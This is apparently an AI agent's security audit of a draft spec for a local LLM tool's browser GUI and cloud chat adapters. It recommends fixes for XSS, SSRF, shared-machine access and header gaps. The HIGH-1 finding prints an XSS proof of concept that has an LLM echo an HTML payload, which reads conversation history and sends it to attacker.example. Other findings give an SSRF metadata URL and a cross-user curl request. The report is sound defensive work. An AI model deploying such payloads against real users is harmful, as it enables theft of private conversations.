# Security Audit Report #37

> **Auditor:** Security Auditor Agent (Security Engineer)
> **Date:** 2026-08-10
> **Scope:** Spec-only audit of `docs/specs/gui-and-harness-adapters.md` (v0.1, Draft) — Browser GUI + pluggable chat harness adapters. No implementation exists yet; all findings are specification gaps that must be resolved before coding begins.
> **Dependencies:** 6 known vulnerabilities (all devDependencies — Vitest/Vite/esbuild; 0 production vulnerabilities per `npm audit --omit=dev`)
> **Previous audits:** #34–#36 all reported GO with no Critical/High findings on the TUI/lifecycle layer. This audit opens a new surface: an HTTP server, SSE streaming, and outbound cloud API calls.

---

## Overall Risk Rating: **HIGH**

The spec introduces the project's first inbound HTTP server and first outbound calls to user-configurable cloud endpoints. Two High findings would be directly exploitable in a realistic implementation following the spec as written. Neither is blocking in the sense of "do not implement any part of this," but both must be resolved in the spec before any code in `src/gui/` or `src/harness/` lands.

---

## Summary

| Severity | Count |
| -------- | ----- |
| Critical | 0     |
| High     | 3     |
| Medium   | 4     |
| Low      | 4     |
| Info     | 2     |

---

## Findings

---

### [HIGH-1] DOM XSS via HTML injection — `stripControl()` does not sanitize HTML

- **Location:** §2 (tech-stack constraints), §4.3 (ClaudeHarness/OpenAiHarness), §4.4 (SSE streaming), `src/gui/static/chat.js` (unwritten)
- **Description:** The spec mandates that all strings received from cloud API responses pass `stripControl()` before SSE emission and storage. However, `stripControl()` (in `src/sanitize.ts`) only removes ANSI escape sequences, C0/C1 control characters, and BiDi overrides. It does **not** strip or encode HTML special characters (`<`, `>`, `&`, `"`, `'`). The spec is entirely silent on how `chat.js` inserts assistant message content into the DOM.

  A natural and common implementation of `chat.js` would use `innerHTML` (or a Markdown renderer that uses `innerHTML` internally) to render assistant replies. If so, any LLM response containing HTML tags — either from a compromised cloud API or via adversarial prompt injection — would execute in the browser. The attacker does not need to compromise the cloud API; they only need to craft a prompt that causes the LLM to echo HTML/JavaScript in its reply, which is trivial.

- **Impact:** Stored XSS within the loopback origin. Exploitable JavaScript executes with full access to the `http://127.0.0.1:<port>` origin, enabling:
  - Exfiltration of all conversation history via `GET /api/history` to an external server.
  - Sending additional turns on behalf of the user (consuming cloud API quota).
  - Switching the active harness.
  - Reading the active model and memory stats.

  **Proof of concept:** A user sends the prompt `"Repeat this exactly: <img src=x onerror='fetch(\"/api/history\").then(r=>r.json()).then(d=>fetch(\"https://attacker.example/?\"+btoa(JSON.stringify(d))))'>"`  to any harness. The LLM echoes the payload. `stripControl()` passes the payload unchanged. If `chat.js` uses `innerHTML`, the `onerror` handler runs, exfiltrating the full conversation history to an external endpoint.

- **Recommendation:** The spec must add two explicit requirements:
  1. **Server side:** `stripControl()` is necessary but not sufficient for a web context. The SSE `content` field must additionally be stated to be plain-text only (no HTML interpretation). The spec should add a note: "The SSE `content` value is terminal-safe Unicode text; it carries no implicit formatting semantics."
  2. **Client side:** `chat.js` **must** insert all assistant response content using `node.textContent = chunk` (or equivalent), never `innerHTML`. Any Markdown rendering library chosen in a future version must operate in a sandbox (e.g., `DOMPurify`-sanitized output, or a Content Security Policy that prevents inline script execution). This requirement must appear in §4.4 and §6, not left to implementor discretion.

---

### [HIGH-2] `assertSafeFetchUrl` allow-list incompatibility leaves SSRF gap undefined

- **Location:** §2 (tech-stack constraints), §4.3 (`OpenAiCompatibleHarness`), §7.1 (threat model), `src/backend/net.ts`
- **Description:** The spec states that `assertSafeFetchUrl()` is called on every cloud API endpoint as the SSRF guard. However, `assertSafeFetchUrl` as implemented requires the target host to appear in an explicit `allowedHosts` list (defaulting to `["huggingface.co", "registry.ollama.ai"]`). This creates two irreconcilable problems:

  **Problem A — Static cloud endpoints fail validation:**
  The spec says `assertSafeFetchUrl("https://api.anthropic.com/v1/messages")` "always passes," but with the default allow-list it would **throw** because `api.anthropic.com` is not in `DEFAULT_ALLOWED_FETCH_HOSTS`. The spec has an incorrect claim. Implementors who discover this will face pressure to disable the allow-list check to make the harnesses work.

  **Problem B — User-supplied `OPENAI_COMPAT_BASE_URL` cannot use an allow-list at all:**
  The compatible harness is designed to reach *any* OpenAI-compatible endpoint. A fixed allow-list is by definition unusable. The SSRF protection here must rely solely on the private-IP/loopback block. But `assertSafeFetchUrl` has no "private-IP-block-only, no allow-list" mode — passing `allowedHosts: []` blocks everything; there is no way to skip the allow-list while keeping the private-IP block active.

  This ambiguity leaves implementors with three bad choices: (a) pass the user-supplied host as its own allow-list entry (circular, undermines the guard), (b) call `assertSafeFetchUrl` and break the harness, or (c) skip `assertSafeFetchUrl` entirely for the compatible harness (removes the SSRF guard).

- **Impact:** If the gap is resolved incorrectly, the SSRF guard is either silently disabled for the compatible harness or the spec's security promise ("assertSafeFetchUrl validates every cloud API endpoint") is not actually true. Scenario: `OPENAI_COMPAT_BASE_URL=http://169.254.169.254/latest/meta-data/` (AWS IMDS). If the SSRF guard is bypassed, the harness would happily POST to the cloud metadata service, potentially exposing IAM credentials in the SSE response.

- **Recommendation:** The spec must resolve both problems explicitly before implementation:
  1. **For static cloud harness endpoints** (`ClaudeHarness`, `OpenAiHarness`): specify that `assertSafeFetchUrl` is called with `{ allowedHosts: ["api.anthropic.com"] }` and `{ allowedHosts: ["api.openai.com"] }` respectively. Remove the incorrect claim that the default-list call "always passes."
  2. **For `OpenAiCompatibleHarness`**: specify that `net.ts` must be extended with a new exported function — provisionally `assertSafeExternalUrl(rawUrl)` — that enforces all SSRF checks (HTTPS-only, no credentials, non-standard port block, private/loopback IP block) but **omits the allow-list step**. The spec should document this explicitly so the SSRF surface is clearly defined and testable.

---

### [HIGH-3] Broken access control on shared developer machines — contradicts §0.6

- **Location:** §1.1 ("Target users"), §0.5–§0.6 (loopback-only, no authentication)
- **Description:** §1.1 explicitly lists "Teams running `local-llmup` as a shared dev machine with a browser UI" as a target use case. §0.6 states "No TLS, no authentication in v1. This is a single-user local developer tool; the loopback boundary is the isolation mechanism." These two goals are directly contradictory.

  `127.0.0.1` is accessible to **every process on the host**, regardless of which OS user spawned them. On a shared Linux/macOS development machine with multiple SSH sessions:
  - User A starts `llmup gui` using their `ANTHROPIC_API_KEY`.
  - User B connects to the same machine via SSH, runs `curl http://127.0.0.1:4000/api/chat -d '{"messages":[{"role":"user","content":"list all /api/history"}]}'`, and can:
    - Send prompts using User A's API key (charging User A's account).
    - Read all of User A's conversation history via `/api/history`.
    - Switch the active harness.
  - The Host header guard (`127.0.0.1:<port>`) does not prevent this because User B's `curl` command sets the correct Host header.

- **Impact:** On any shared machine: unauthorized use of cloud API credentials (financial), exfiltration of conversation history, and conversation injection. This is OWASP A1 (Broken Access Control).

- **Recommendation:** The spec must resolve the contradiction. Two options:
  1. **Remove the shared-machine use case from §1.1** and add a warning: "The GUI must not be run on shared machines with multiple OS users. The loopback binding provides no isolation between users on the same host." Update §7.1 to acknowledge this limitation.
  2. **Add optional single-use token authentication** (a random token generated at server start, printed to stdout, required as a query parameter or `Authorization: Bearer` header on every request). This would confine the server to the spawning user's shell session without requiring HTTPS. The token would not be a secret stored anywhere; it is displayed once on stdout at startup. This is consistent with Jupyter Notebook's security model.

  Option 1 is the minimal-change path and consistent with v1 scope. Option 2 makes the shared-machine use case viable.

---

### [MEDIUM-1] Cloud API error body potentially forwarded through SSE `error` event

- **Location:** §4.4 (SSE event format), §4.3 (ClaudeHarness/OpenAiHarness error handling)
- **Description:** The spec specifies that cloud API responses pass Zod validation before yield, and that `content` strings are `stripControl()`-sanitized before SSE emission. However, for error conditions (cloud API returning 4xx/5xx), the spec does not address how the error response body is handled before being forwarded as an SSE `{"type":"error","message":"..."}` event.

  Cloud API error responses can contain:
  - Partial echo of the request (which may contain conversation content).
  - Structured error details that include model names, request IDs, or account identifiers.
  - In rare cases (misconfigured proxies), fragments of the API key.

  The spec says "Keys are never interpolated in error strings" (§7.2) but this applies to application-generated strings, not to cloud API response bodies that are forwarded as-is.

- **Impact:** Information disclosure via SSE error events: conversation fragments, account details, or API metadata could reach the browser in uncontrolled form. Not directly exploitable for privilege escalation but violates the data minimisation principle.
- **Recommendation:** §4.3 and §4.4 must require that cloud API error responses are:
  1. Never forwarded as raw strings to SSE consumers.
  2. Mapped to application-defined error codes or generic messages (e.g., `"Harness returned error: 429 rate-limited"` not the raw response body).
  3. Logged (sanitized) at the Node process level only. Add this requirement to §7.1 in a new threat row: "Cloud API error body leakage → map to generic codes; never forward raw body to SSE."

---

### [MEDIUM-2] SSE connection lifetime unbounded — no per-connection timeout specified

- **Location:** §4.4 (SSE streaming), §4.3 (16 MiB response cap), §7.1 (cloud API cost runaway)
- **Description:** The spec specifies a 16 MiB per-response byte cap for upstream cloud fetch responses, and mentions aborting on signal. However, it does not specify:
  1. A maximum wall-clock duration for a single SSE connection.
  2. What happens when the browser client disconnects mid-stream (connection close detection).
  3. Whether the upstream cloud API request is aborted when the browser disconnects.

  A browser tab refresh, network drop, or browser close while streaming would leave the upstream fetch (and token generation) running until the response cap is hit. For cloud harnesses, this silently charges the user for tokens that are never delivered to the UI.

- **Impact:** Runaway cloud API cost if clients disconnect frequently; potential server-side resource leak from abandoned goroutines/async iterators if the upstream response takes time to hit the 16 MiB cap. This also partially undermines the "cloud model API cost runaway" mitigation listed in §7.1.
- **Recommendation:** §4.4 must specify: (a) The server detects HTTP connection close (via Node's `req.socket` close event or `res.on('close')`), and propagates an `AbortSignal` cancel to the `HarnessChatRequest.signal`. (b) A maximum SSE connection duration (e.g., 5 minutes) after which the server sends `{"type":"error","message":"stream timeout"}` and closes the connection. Both requirements should be added to the G6 acceptance criteria in §8.4.

---

### [MEDIUM-3] Memory store key namespace collision between cloud harnesses and local models

- **Location:** §4.5 (memory integration), §3.2 (`llmup chat --harness` model resolution)
- **Description:** The spec keys cloud harness memory on `harness.name + ":" + model` (e.g., `"claude:claude-3-5-haiku-20241022"`). The `assertSafeModelId` pattern in `net.ts` permits colons in model IDs (`/^[a-z0-9._:/]...*/`). A locally-pulled model could legitimately be named `claude:latest` (a valid Ollama registry tag). The local harness would key memory on the resolved catalog `model.id`, which could be `claude:latest`. The cloud harness would key memory on `"claude:claude-3-5-haiku-20241022"`.

  More concerningly: if a local model is named `openai:gpt-4o` (not unreasonable for a quantized distillation), its local memory store key is `openai:gpt-4o`. The OpenAI harness with model `gpt-4o` would key on `"openai:gpt-4o"` — an exact collision. Conversation history from local usage would be mixed with cloud usage under the same key.

- **Impact:** Conversation history cross-contamination between local and cloud sessions; potential for confused identity in the memory store when migrating.
- **Recommendation:** §4.5 must add a separator that is not valid in Ollama model IDs. The `assertSafeModelId` pattern allows `a-z`, `0-9`, `.`, `_`, `:`, `/`, `-`. A double-colon or a prefix sigil that is not in the allowed set would work: `"@claude/claude-3-5-haiku-20241022"` (using `@` which is not in the allow-list) or simply `"harness::claude::claude-3-5-haiku-20241022"` (double-colon never appears in Ollama registry refs). Specify the exact separator in §4.5 and enforce it in the G2/G8 acceptance criteria.

---

### [MEDIUM-4] Null byte injection not addressed in static file path traversal protection

- **Location:** §7.3 (`resolveStaticPath`)
- **Description:** The `resolveStaticPath` spec shows `path.resolve(root, rel)` followed by a `startsWith(root + path.sep)` containment check. It does not require explicit rejection of null bytes (`\0`, `%00`) in `rel`. While Node.js `fs` functions throw `ERR_INVALID_ARG_VALUE` for paths containing null bytes on modern Node.js (≥ 14), this is a runtime error, not a validated 400 response. The spec does not specify how this error is caught and converted to a 400.

- **Impact:** If null byte handling is left to runtime error propagation and the runtime error is not caught gracefully, it could produce an unstructured 500 response that leaks stack trace information. Unlikely to lead to path traversal on modern Node.js, but the spec should be explicit.
- **Recommendation:** §7.3 should add: "If `rel` contains a null byte (`\0`) or any character outside printable ASCII (< 0x20 or > 0x7e), return 400 immediately without invoking `path.resolve`." This makes the defence explicit and independently testable without relying on Node.js's internal error handling.

---

### [LOW-1] No Content-Security-Policy header specified for served HTML

- **Location:** §4.4 (HTTP API), §7.3 (static file security)
- **Description:** The spec specifies the SSE response headers and the Host header guard but does not specify security headers for `GET /` or `GET /static/*` responses. Without a `Content-Security-Policy: default-src 'self'` (or stricter) header, the browser's default permissive policy applies. If any future version of `chat.js` loads an external resource, introduces an inline event handler, or if a path traversal bypass is found, a strict CSP provides a critical last line of defence.
- **Recommendation:** §4.4 should specify that `GET /` and `GET /static/*` responses include at minimum:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'none'
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  ```
  These are zero-cost headers for a loopback server and are standard defence-in-depth. Add to §7.1 threat model as a row: "Code injection via future UI changes → strict CSP."

---

### [LOW-2] `X-Frame-Options` / `frame-ancestors` absent; GUI can be iframed

- **Location:** §4.4, §7.1
- **Description:** Without `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`, the GUI page can be embedded in an iframe by any other page that runs in the browser (including local `file://` pages or other loopback servers). Although API calls from a cross-origin iframe would fail the Host header guard, click-jacking of the GUI itself (tricking the user into sending a prompt they didn't intend) is possible.
- **Recommendation:** Covered by the CSP recommendation in LOW-1. Specifically call out `X-Frame-Options: DENY` in §4.4 response headers.

---

### [LOW-3] Source map extension (`.map`) in static file whitelist on shared machines

- **Location:** §7.3 (`resolveStaticPath`)
- **Description:** The static file extension allowlist includes `.map` (JavaScript source maps). On a shared development machine, source maps expose unminified source code, including inline comments that may document security assumptions, internal endpoint structure, or business logic. While the current GUI has no minification step (vanilla JS), listing `.map` as an allowed extension anticipates a future bundled build and should be treated as a future information-disclosure risk in a shared context.
- **Recommendation:** Remove `.map` from the allowlist in v1 since no bundler is used. If source maps are needed in a future build, add them only in development mode, not in the served production static set. Document this in §7.3.

---

### [LOW-4] `assertSafeFetchUrl` "always passes" claim is factually incorrect

- **Location:** §4.3 (ClaudeHarness description)
- **Description:** The spec states: "`assertSafeFetchUrl("https://api.anthropic.com/v1/messages")` called at module init — this is a static constant so it always passes." This is incorrect. `assertSafeFetchUrl` with the default `allowedHosts` (`["huggingface.co", "registry.ollama.ai"]`) would throw `ValidationError("fetch host not allow-listed: api.anthropic.com")` at module init, crashing the process. The claim "always passes" is only true if the allowed-hosts list is extended for harness use — but this is not specified.
- **Recommendation:** This is subsumed by HIGH-2. However, the incorrect factual claim in §4.3 must be corrected regardless of how HIGH-2 is resolved, to prevent confusion during implementation.

---

### [INFO-1] Single-tab session model creates implicit cross-tab interference

- **Location:** §4.4 (session model), §4.4 ("One in-memory GuiSession object per Node process (single-tab v1)")
- **Description:** The single-session model means that if a user opens two browser tabs both pointing to the same `llmup gui` instance, the second tab's harness switch or message will overwrite the first tab's session state. This is documented ("single-tab v1") but not enforced by the server — the spec does not specify that the server rejects requests from a second simultaneous connection. A user debugging on two screens could inadvertently corrupt their own session.
- **Impact:** No security impact; usability concern. Informational.
- **Recommendation:** §4.4 should note: "The server does not enforce single-tab use. Multiple concurrent browser connections to the same server share a single session. This is known and expected in v1."

---

### [INFO-2] `llmup gui` auto-open uses `child_process.exec` with platform-native commands

- **Location:** §9, G7 (Implementation plan: "use platform-native commands — no new dep; use `child_process.exec(xdg-open/open/start)`")
- **Description:** The spec proposes opening the browser by calling `xdg-open`, `open`, or `start` via `child_process.exec`. The URL passed is `http://127.0.0.1:<port>`, where `<port>` is user-controlled (via `--port`). The spec already validates `--port` as a 1–65535 integer, so the URL is not subject to injection. However, `child_process.exec` (shell: true) is inherently riskier than `child_process.execFile` (shell: false). If `--port` validation were ever relaxed, this would become an injection vector.
- **Impact:** Not exploitable with the current spec constraints. Informational.
- **Recommendation:** §9 G7 should specify `child_process.execFile(['open', url])` / `execFile(['xdg-open', url])` (shell: false) rather than `exec`. This is a minor defensive change that eliminates a shell-injection class even if validation is inadvertently weakened in the future.

---

## Threat Model Gap Analysis (§7.1)

The threat model table in §7.1 is a good starting point but has the following gaps relative to the attack surface introduced:

| Gap | Severity | Finding |
|---|---|---|
| DOM XSS via HTML in assistant response | HIGH | HIGH-1 |
| Cloud API error body forwarded to browser | MEDIUM | MEDIUM-1 |
| Unbounded SSE connection lifetime | MEDIUM | MEDIUM-2 |
| Memory store key collision across harness types | MEDIUM | MEDIUM-3 |
| Shared-machine multi-user access (contradicts §0.6) | HIGH | HIGH-3 |
| SSRF guard API incompatible with harness use cases | HIGH | HIGH-2 |
| CSP / X-Frame-Options absent | LOW | LOW-1, LOW-2 |

**The existing §7.1 rows that are correctly specified:** DNS rebinding → Host header match; SSRF via OPENAI_COMPAT_BASE_URL → assertSafeFetchUrl; API key leakage in errors; Path traversal → whitelist + containment; Oversized request body → 64 KiB cap; CSRF → same-origin SSE + Host guard; Cost runaway → no retry + abort + cap.

---

## Positive Observations

- **DNS rebinding defence is correctly specified.** Exact-match `Host: 127.0.0.1:<port>` on every handler (not just on the API endpoints) with a 400 immediate response is the correct, well-understood mitigation. No `localhost` variant allowed is correct and intentional.
- **`assertSafeModelId` is applied at process-argument boundaries.** The model ID allow-list pattern correctly rejects shell metacharacters before any backend invocation.
- **API key injection seam is correctly designed.** The `getEnv(key)` dep seam, constructor injection, and explicit test pattern in §6.1 make it structurally impossible to leak keys in test output.
- **64 KiB request body cap is present and test-enforced.** The G6 acceptance criterion explicitly requires a 413 test.
- **16 MiB upstream response cap is consistent with the existing catalog enrichment pattern.** Good precedent reuse.
- **No new runtime dependencies.** The zero-new-runtime-dep constraint in §0.7 prevents supply-chain risk from third-party SSE or HTTP libraries.
- **SSE `content` passes `stripControl()`.** This correctly covers terminal ANSI injection and Trojan-Source BiDi attacks. It is a necessary condition, though not sufficient for an HTML rendering context (see HIGH-1).
- **No cookies, no tokens, no CSRF tokens** eliminates the classical CSRF attack vector in favour of the Host header guard — a correct and simpler design for a loopback-only tool.
- **`AbortSignal` is in the `HarnessChatRequest` interface.** The signal seam is present; it just needs to be wired to browser disconnect detection in the spec (see MEDIUM-2).

---

## Action Items (Priority Order)

| # | Severity | Finding | Required Spec Change |
| --- | --- | --- | --- |
| 1 | High | DOM XSS via HTML injection in chat.js | Require `textContent`-only DOM insertion; add to §4.4 and §6 |
| 2 | High | assertSafeFetchUrl allow-list incompatible with harness URLs | Specify per-harness allowed-hosts; define `assertSafeExternalUrl` for compatible harness |
| 3 | High | Broken access control on shared machines | Remove shared-machine use case from §1.1 or add single-use token auth |
| 4 | Medium | Cloud API error body leakage via SSE error events | Map errors to generic codes; never forward raw body |
| 5 | Medium | Unbounded SSE connection lifetime | Add browser-disconnect abort propagation and max-duration to §4.4 + G6 criteria |
| 6 | Medium | Memory store key collision across harness types | Specify collision-safe separator not in assertSafeModelId charset |
| 7 | Medium | Null byte not explicitly rejected in path traversal guard | Add explicit null-byte rejection to §7.3 |
| 8 | Low | No CSP / X-Frame-Options specified | Add security headers to §4.4 response spec |
| 9 | Low | .map extension in static allowlist | Remove from v1 allowlist |
| 10 | Low | "always passes" claim incorrect in §4.3 | Correct the factual error; resolved by addressing HIGH-2 |
